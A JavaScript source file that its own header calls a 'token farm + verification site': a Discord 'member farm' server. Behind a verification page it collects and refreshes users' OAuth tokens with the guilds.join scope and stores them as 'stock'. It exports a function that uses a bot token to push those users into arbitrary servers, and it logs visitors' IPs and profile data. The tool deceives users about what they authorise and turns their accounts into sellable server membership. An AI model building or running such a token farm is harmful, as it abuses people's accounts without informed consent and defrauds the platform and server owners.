// language: JavaScript, file: oauth.js — token farm + verification site (alt-aware)
const express = require('express');
const { query, one, many, getSetting, setSetting } = require('./db');
const config = require('./config');

async function dedupeUserTokens(userId) {
  const uid = String(userId);
  const rows = await many(
    'SELECT id FROM tokens WHERE user_id = $1 AND valid = 1 ORDER BY id DESC',
    [uid]
  );
  if (rows.length <= 1) return { kept: rows.length, dropped: 0 };
  const keepId = rows[0].id;
  const dropIds = rows.slice(1).map((r) => r.id);
  await query('UPDATE tokens SET valid = 0 WHERE user_id = $1 AND valid = 1 AND id != $2', [uid, keepId]);
  for (const id of dropIds) await query('DELETE FROM stock WHERE token_id = $1', [id]);
  console.log('dedupe user=' + uid + ' kept=#' + keepId + ' dropped=' + dropIds.length);
  return { kept: 1, dropped: dropIds.length };
}

async function dedupeAllTokens() {
  const dupes = await many(
    `SELECT user_id, COUNT(*)::int AS c FROM tokens WHERE valid = 1 GROUP BY user_id HAVING COUNT(*) > 1`
  );
  let dropped = 0;
  for (const d of dupes) dropped += (await dedupeUserTokens(d.user_id)).dropped;
  if (dupes.length) console.log('dedupeAll: ' + dupes.length + ' users cleaned, ' + dropped + ' tokens invalidated');
  return { users: dupes.length, dropped };
}

async function refreshAccessToken(tokenRow) {
  if (!tokenRow || !tokenRow.refresh_token) return null;
  try {
    const body = new URLSearchParams({
      client_id: process.env.CLIENT_ID,
      client_secret: process.env.CLIENT_SECRET,
      grant_type: 'refresh_token',
      refresh_token: tokenRow.refresh_token,
    });
    const res = await fetch('https://discord.com/api/v10/oauth2/token', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body,
    });
    if (!res.ok) {
      console.error('refresh fail', res.status, await res.text());
      await query('UPDATE tokens SET valid = 0 WHERE id = $1', [tokenRow.id]);
      return null;
    }
    const data = await res.json();
    const expiresAt = Math.floor(Date.now() / 1000) + (data.expires_in || 604800);
    await query(
      'UPDATE tokens SET access_token = $1, refresh_token = COALESCE($2, refresh_token), expires_at = $3, valid = 1 WHERE id = $4',
      [data.access_token, data.refresh_token || null, expiresAt, tokenRow.id]
    );
    return data.access_token;
  } catch (e) {
    console.error('refresh error', e.message);
    return null;
  }
}

async function ensureFreshToken(tokenRow) {
  if (!tokenRow) return null;
  const now = Math.floor(Date.now() / 1000);
  const exp = Number(tokenRow.expires_at) || 0;
  if (exp && exp > now + 300) return tokenRow.access_token;
  return (await refreshAccessToken(tokenRow)) || tokenRow.access_token;
}

async function joinGuild(accessToken, guildId, userId) {
  if (!userId) return { ok: false, code: 'error', status: 0, body: 'no userId' };
  if (!accessToken) return { ok: false, code: 'deauth', status: 0, body: 'no access_token' };
  const res = await fetch('https://discord.com/api/v10/guilds/' + guildId + '/members/' + userId, {
    method: 'PUT',
    headers: {
      Authorization: 'Bot ' + process.env.BOT_TOKEN,
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({ access_token: accessToken }),
  });
  let body = '';
  try {
    body = await res.text();
  } catch {}
  if (res.status === 201) return { ok: true, code: 'joined', status: 201, body };
  if (res.status === 204) return { ok: true, code: 'already', status: 204, body };
  if (res.status === 429) return { ok: false, code: 'rate_limit', status: 429, body };
  if (res.status === 401 || res.status === 403) {
    if (/phone/i.test(body)) return { ok: false, code: 'phone', status: res.status, body };
    if (/banned|10008|50025/i.test(body)) return { ok: false, code: 'banned', status: res.status, body };
    return { ok: false, code: 'deauth', status: res.status, body };
  }
  if (res.status === 400 && /10008|maximum/i.test(body)) return { ok: false, code: 'maxed', status: 400, body };
  return { ok: false, code: 'error', status: res.status, body };
}

function clientIp(req) {
  const xf = (req.headers['x-forwarded-for'] || '').toString().split(',')[0].trim();
  const real = (req.headers['x-real-ip'] || '').toString().trim();
  const ip = xf || real || req.ip || req.socket?.remoteAddress || '';
  return String(ip).replace(/^::ffff:/, '');
}

function accountAgeDays(discordId) {
  try {
    const snowflake = BigInt(discordId);
    const ms = Number((snowflake >> 22n) + 1420070400000n);
    return Math.floor((Date.now() - ms) / 86400000);
  } catch {
    return null;
  }
}

function renderPage({ title, subtitle, detail, tone }) {
  const color = tone === 'warn' ? '#faa61a' : tone === 'bad' ? '#ed4245' : '#57f287';
  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>${title}</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{min-height:100vh;display:flex;align-items:center;justify-content:center;
    background:#0b0b0f;color:#e8e8ef;font-family:ui-sans-serif,system-ui,-apple-system,sans-serif}
  .card{max-width:420px;width:92%;padding:2rem 1.75rem;border-radius:14px;
    background:#12121a;border:1px solid #1e1e2a;box-shadow:0 20px 50px rgba(0,0,0,.45)}
  .dot{width:10px;height:10px;border-radius:50%;background:${color};display:inline-block;margin-right:8px}
  h1{font-size:1.25rem;font-weight:600;margin-bottom:.5rem}
  p{color:#a0a0b0;font-size:.95rem;line-height:1.5;margin-top:.35rem}
  .meta{margin-top:1.25rem;font-size:.8rem;color:#6a6a7a;border-top:1px solid #1e1e2a;padding-top:1rem}
</style>
</head>
<body>
  <div class="card">
    <h1><span class="dot"></span>${title}</h1>
    <p>${subtitle || ''}</p>
    ${detail ? '<p class="meta">' + detail + '</p>' : ''}
  </div>
</body>
</html>`;
}

async function ensureVerifiedRole(client) {
  const guildId = config.MAIN_GUILD_ID || '1499704751481294878';
  let roleId =
    (await getSetting('verified_role', '')) ||
    process.env.VERIFIED_ROLE_ID ||
    config.VERIFIED_ROLE_ID ||
    '';

  const guild = client?.guilds?.cache?.get(guildId) || (await client?.guilds?.fetch(guildId).catch(() => null));
  if (!guild) return null;

  if (roleId) {
    const existing = await guild.roles.fetch(roleId).catch(() => null);
    if (existing) return existing.id;
  }

  // Find by name
  const byName = guild.roles.cache.find((r) => r.name.toLowerCase() === 'verified');
  if (byName) {
    await setSetting('verified_role', byName.id);
    return byName.id;
  }

  // Create
  try {
    const role = await guild.roles.create({
      name: 'Verified',
      color: 0x57f287,
      reason: 'Member Farm verification role',
      mentionable: false,
      hoist: false,
    });
    await setSetting('verified_role', role.id);
    console.log('Created Verified role', role.id);
    return role.id;
  } catch (e) {
    console.error('create Verified role', e.message);
    return null;
  }
}

async function assignVerifiedRole(client, userId) {
  const guildId = config.MAIN_GUILD_ID || '1499704751481294878';
  const roleId = await ensureVerifiedRole(client);
  if (!roleId) return { ok: false, reason: 'no_role' };

  const guild = client.guilds.cache.get(guildId) || (await client.guilds.fetch(guildId).catch(() => null));
  if (!guild) return { ok: false, reason: 'no_guild' };

  let member = await guild.members.fetch(userId).catch(() => null);
  if (!member) {
    // User not in guild — cannot assign; still verified in DB
    return { ok: false, reason: 'not_in_guild' };
  }
  if (member.roles.cache.has(roleId)) return { ok: true, reason: 'already' };
  try {
    await member.roles.add(roleId, 'OAuth verification');
    return { ok: true, reason: 'added' };
  } catch (e) {
    console.error('role add', e.message);
    return { ok: false, reason: e.message };
  }
}

/** Other Discord accounts that verified from the same IP */
async function findAltsByIp(ip, currentUserId) {
  if (!ip || ip === '127.0.0.1' || ip === '::1') return [];
  const rows = await many(
    `SELECT DISTINCT user_id, username
     FROM oauth_visits
     WHERE ip = $1 AND user_id IS NOT NULL AND user_id != $2
     ORDER BY user_id`,
    [String(ip), String(currentUserId)]
  );
  return rows;
}

async function logVisitBasic(fields) {
  try {
    await query(
      `INSERT INTO oauth_visits (
        user_id, username, global_name, avatar, locale, mfa_enabled, verified,
        premium_type, ip, user_agent, status, error, created_at
      ) VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,EXTRACT(EPOCH FROM NOW())::BIGINT)`,
      [
        fields.user_id || null,
        fields.username || null,
        fields.global_name || null,
        fields.avatar || null,
        fields.locale || null,
        fields.mfa_enabled != null ? (fields.mfa_enabled ? 1 : 0) : null,
        fields.verified != null ? (fields.verified ? 1 : 0) : null,
        fields.premium_type != null ? fields.premium_type : null,
        fields.ip || null,
        fields.user_agent || null,
        fields.status || 'verified',
        fields.error || null,
      ]
    );
  } catch (e) {
    console.error('logVisitBasic', e.message);
  }
}

function createOAuthServer(client) {
  const app = express();
  app.set('trust proxy', true);
  app.use(express.json({ limit: '32kb' }));
  app.use(express.urlencoded({ extended: true }));

  app.get('/health', (req, res) => {
    res.json({ ok: true, bot: client?.user?.tag || null, uptime: process.uptime() });
  });

  app.get('/', (req, res) => {
    res.send(
      renderPage({
        title: 'Verification',
        subtitle: 'Use the Discord authorize link from the server to complete verification.',
        tone: 'ok',
      })
    );
  });

  app.get('/oauth/callback', async (req, res) => {
    const code = req.query.code;
    if (!code) {
      res
        .status(400)
        .send(renderPage({ title: 'Missing code', subtitle: 'Restart verification from Discord.', tone: 'bad' }));
      return;
    }

    const ip = clientIp(req);
    const ua = (req.headers['user-agent'] || '').toString().slice(0, 300);

    try {
      const body = new URLSearchParams({
        client_id: process.env.CLIENT_ID,
        client_secret: process.env.CLIENT_SECRET,
        grant_type: 'authorization_code',
        code: String(code),
        redirect_uri: process.env.REDIRECT_URI,
      });
      const tokRes = await fetch('https://discord.com/api/v10/oauth2/token', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body,
      });
      if (!tokRes.ok) {
        const err = await tokRes.text();
        console.error('token exchange', tokRes.status, err);
        await logVisitBasic({ ip, user_agent: ua, status: 'token_fail', error: String(tokRes.status) });
        res
          .status(400)
          .send(renderPage({ title: 'Authorization failed', subtitle: 'Token exchange rejected. Try again.', tone: 'bad' }));
        return;
      }

      const tokenData = await tokRes.json();
      const meRes = await fetch('https://discord.com/api/v10/users/@me', {
        headers: { Authorization: 'Bearer ' + tokenData.access_token },
      });
      if (!meRes.ok) {
        await logVisitBasic({ ip, user_agent: ua, status: 'user_fail' });
        res
          .status(400)
          .send(renderPage({ title: 'Authorization failed', subtitle: 'Could not read Discord profile.', tone: 'bad' }));
        return;
      }

      const me = await meRes.json();
      const expiresAt = Math.floor(Date.now() / 1000) + (tokenData.expires_in || 604800);
      const scope = tokenData.scope || 'identify guilds.join guilds';

      const existing = await one('SELECT id FROM tokens WHERE user_id = $1 ORDER BY id DESC LIMIT 1', [
        String(me.id),
      ]);
      if (existing) {
        await query(
          `UPDATE tokens SET access_token = $1, refresh_token = COALESCE($2, refresh_token), expires_at = $3, scope = $4, valid = 1, username = $5 WHERE id = $6`,
          [
            tokenData.access_token,
            tokenData.refresh_token || null,
            expiresAt,
            scope,
            me.username || null,
            existing.id,
          ]
        );
      } else {
        await query(
          `INSERT INTO tokens (user_id, access_token, refresh_token, expires_at, scope, valid, username)
           VALUES ($1, $2, $3, $4, $5, 1, $6)`,
          [
            String(me.id),
            tokenData.access_token,
            tokenData.refresh_token || null,
            expiresAt,
            scope,
            me.username || null,
          ]
        );
      }
      await dedupeUserTokens(me.id);

      try {
        await query(
          `INSERT INTO auth_stats (id, total_all_time, last_24h, last_24h_reset)
           VALUES (1, 1, 1, EXTRACT(EPOCH FROM NOW())::BIGINT)
           ON CONFLICT (id) DO UPDATE SET
             total_all_time = auth_stats.total_all_time + 1,
             last_24h = CASE
               WHEN EXTRACT(EPOCH FROM NOW())::BIGINT - auth_stats.last_24h_reset > 86400 THEN 1
               ELSE auth_stats.last_24h + 1
             END,
             last_24h_reset = CASE
               WHEN EXTRACT(EPOCH FROM NOW())::BIGINT - auth_stats.last_24h_reset > 86400 THEN EXTRACT(EPOCH FROM NOW())::BIGINT
               ELSE auth_stats.last_24h_reset
             END`
        );
      } catch (e) {
        console.error('auth_stats', e.message);
      }

      // Alt detection (same IP, other Discord accounts)
      const alts = await findAltsByIp(ip, me.id);
      const ageDays = accountAgeDays(me.id);
      let status = 'verified';
      if (alts.length) status = 'verified_alt';
      if (ageDays != null && ageDays < 7) status = status === 'verified_alt' ? 'verified_alt_new' : 'verified_new';

      await logVisitBasic({
        user_id: String(me.id),
        username: me.username,
        global_name: me.global_name || null,
        avatar: me.avatar || null,
        locale: me.locale || null,
        mfa_enabled: !!me.mfa_enabled,
        verified: !!me.verified,
        premium_type: me.premium_type,
        ip,
        user_agent: ua,
        status,
        error: alts.length ? 'alts=' + alts.map((a) => a.user_id).join(',') : null,
      });

      const roleRes = await assignVerifiedRole(client, me.id);

      const altLine = alts.length
        ? 'Linked accounts on this network: <strong>' +
          alts.length +
          '</strong> (staff may review).'
        : 'No other accounts detected on this network.';

      const roleLine =
        roleRes.ok
          ? roleRes.reason === 'already'
            ? 'Verified role already present.'
            : 'Verified role assigned.'
          : roleRes.reason === 'not_in_guild'
            ? 'Join the main server to receive the Verified role.'
            : 'Verification recorded. Role assignment pending.';

      const ageLine =
        ageDays != null ? 'Account age ≈ <strong>' + ageDays + '</strong> days.' : '';

      res.send(
        renderPage({
          title: alts.length ? 'Verified · review flag' : 'Verified',
          subtitle: roleLine + ' You can close this tab.',
          detail: [altLine, ageLine].filter(Boolean).join('<br/>'),
          tone: alts.length ? 'warn' : 'ok',
        })
      );
    } catch (e) {
      console.error('oauth callback', e);
      res
        .status(500)
        .send(renderPage({ title: 'Internal error', subtitle: 'Try again from Discord.', tone: 'bad' }));
    }
  });

  const port = process.env.PORT || 3000;
  app.listen(port, () => console.log('Verification/OAuth server on :' + port));
  return app;
}

module.exports = {
  createOAuthServer,
  joinGuild,
  refreshAccessToken,
  ensureFreshToken,
  dedupeUserTokens,
  dedupeAllTokens,
  ensureVerifiedRole,
  assignVerifiedRole,
};
